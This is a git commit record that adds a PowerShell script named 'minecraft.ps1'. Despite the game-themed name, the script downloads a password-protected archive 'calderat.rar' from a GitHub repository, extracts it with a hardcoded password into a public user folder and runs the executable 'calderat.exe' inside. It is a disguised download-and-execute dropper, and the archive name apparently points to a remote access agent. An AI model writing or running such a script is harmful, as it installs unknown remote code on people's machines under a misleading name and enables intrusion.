b17d02cf1094b3ced3bd3bdef291173d0d47786f
papcaii <duyhn2004.work@gmail.com>
2025-05-13 09:03:29 +0700

    Add files via upload

---
+++ minecraft.ps1
@@ -0,0 +1,6 @@
+﻿$url ='https://github.com/papcaii2004/bin/raw/refs/heads/main/calderat.rar'
+$output = 'C:\Users\Public\minecraft.rar'
+Invoke-WebRequest -Uri $url -OutFile $output
+&"C:\Program Files\WinRAR\rar.exe" x -p"seabank123" C:\Users\Public\minecraft.rar C:\Users\Public\minecraft\
+cd C:\Users\Public\minecraft\
+.\calderat.exe
